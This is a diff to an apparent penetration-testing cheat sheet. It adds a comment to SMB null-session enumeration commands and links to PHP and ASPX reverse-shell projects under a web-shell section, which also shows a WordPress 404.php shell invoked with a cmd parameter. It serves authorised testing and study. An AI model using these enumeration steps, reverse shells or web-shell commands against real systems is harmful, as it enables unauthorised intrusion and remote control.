@@ -194,7 +194,7 @@ rpcclient -U "" -N $ip
 - always check autorecon scans results on the SMB version to find exploitation
 
 ```bash
-#checking Null session and check share listing
+#checking Null session and check share listing (-N = no password)
 smbmap -H x.X.X.x
 smbclient -L \\\\X.X.X.x -U '' -N
 smbclient \\\\x.x.x.x\\[sharename e.g.wwwroot]
@@ -470,7 +470,8 @@ return 0;
 ```
 
 ## Web Shell
-
+- php : https://github.com/ivan-sincek/php-reverse-shell?tab=readme-ov-file
+- aspx : https://github.com/borjmz/aspx-reverse-shell
 ```php
 #wordpress
 http://x.x.x.x/404.php?cmd=id
